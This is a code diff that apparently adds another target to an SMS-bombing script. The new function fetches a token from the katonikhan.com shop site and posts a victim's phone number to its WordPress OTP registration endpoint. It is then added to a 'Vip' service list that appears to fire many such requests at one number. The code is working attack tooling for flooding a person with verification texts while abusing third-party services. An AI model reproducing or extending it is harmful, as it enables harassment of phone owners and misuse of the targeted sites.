@@ -48,6 +48,74 @@ def check_internet():
 # ------------------------------
 
 
+
+def katonikhan(phone):
+    import requests
+    import re
+    
+    digits_phone = phone.replace("+98", "")
+    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"  # با + بین اعداد
+    
+    try:
+        session = requests.Session()
+        home_response = session.get("https://katonikhan.com/", timeout=10)
+        
+        # استخراج instance_id
+        instance_id = None
+        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
+        match = re.search(instance_pattern, home_response.text)
+        if match:
+            instance_id = match.group(1)
+        
+        if not instance_id:
+            instance_id = "c1866f4215f82aaedb42ab38190ef1fa"  # مقدار پیشفرض
+        
+        url = "https://katonikhan.com/wp-admin/admin-ajax.php"
+        
+        payload = {
+            "phone": formatted_phone,  # با + بین اعداد
+            "digt_countrycode": "+98",
+            "digits_process_register": "1",
+            "instance_id": instance_id,
+            "optional_data": "optional_data",
+            "action": "digits_forms_ajax",
+            "type": "register",
+            "dig_otp": "",
+            "digits": "1",
+            "digits_redirect_page": "-1",
+            "aio_special_field": "",
+            "digits_form": "92e2d882a6",  # ممکنه نیاز به استخراج داشته باشه
+            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F"
+        }
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://katonikhan.com",
+            "Referer": "https://katonikhan.com/",
+        }
+        
+        response = session.post(url, data=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            response_data = response.json()
+            if response_data.get("success") is True:
+                print(f'{g}(katonikhan) {a}Code Sent')
+                return True
+        
+        print(f'{r}[-] (katonikhan) Failed{a}')
+        return False
+            
+    except Exception:
+        print(f'{r}[-] (katonikhan) Failed{a}')
+        return False
+
+
+
+
+
+
 def katoonistore(phone):
     import requests
     import re
@@ -224,6 +292,7 @@ def Vip(phone, Time):
         digikala,
         hajamooo,
         katoonistore,
+        katonikhan,
         # سرویس‌های دیگه بعداً اینجا اضافه میشن
     ]
     total_services = len(services)
